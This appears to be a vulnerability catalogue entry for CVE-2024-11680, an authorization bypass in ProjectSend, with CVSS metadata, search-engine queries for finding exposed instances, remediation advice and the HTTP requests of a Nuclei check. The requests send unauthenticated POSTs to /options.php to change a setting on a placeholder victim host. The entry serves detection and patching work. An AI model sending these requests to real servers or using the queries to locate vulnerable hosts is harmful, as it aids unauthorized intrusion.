---
layout: "post"
cve_id: "CVE-2024-11680"
title: "ProjectSend <= r1605 - Improper Authorization"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-11680.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-11680.yaml"
author: "DhiyaneshDK"
severity: "critical"
impact: "Unauthenticated attackers can bypass authorization checks to perform sensitive actions such as enabling user registration, modifying whitelists, and ultimately achieving remote code execution.
"
remediation: "Upgrade ProjectSend to version r1700 or later.
"
reference:
  - "https://www.projectsend.org/"
  - "https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf"
  - "https://vulncheck.com/advisories/projectsend-bypass"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2024-11680', 'cwe-id': 'CWE-287,CWE-863', 'epss-score': 0.9349, 'epss-percentile': 0.99811, 'cpe': 'cpe:2.3:a:projectsend:projectsend:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'projectsend', 'product': 'projectsend', 'shodan-query': ['http.html:"projectsend"', 'http.html:"projectsend setup"', 'http.html:"provided by projectsend"'], 'fofa-query': ['body="projectsend"', 'body="projectsend setup"', 'body=provided by projectsend'], 'google-query': 'intext:provided by projectsend'}"
tags:
  - "cve"
  - "cve2024"
  - "projectsend"
  - "auth-bypass"
  - "intrusive"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
An improper authorization check was identified within ProjectSend version r1605 that allows an attacker to perform sensitive actions such as enabling user registration and auto validation, or adding new entries in the whitelist of allowed extensions for uploaded files. Ultimately, this allows to execute arbitrary PHP code on the server hosting the application.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /options.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Content-Length: 80
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

csrf_token=uRf5Gy&section=general&this_install_title=38BIa7IoBO3VcxjFyMfAqO4iVS4
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /options.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Connection: close
Content-Length: 59
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

csrf_token=uRf5Gy&section=general&this_install_title=hWX31Y
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

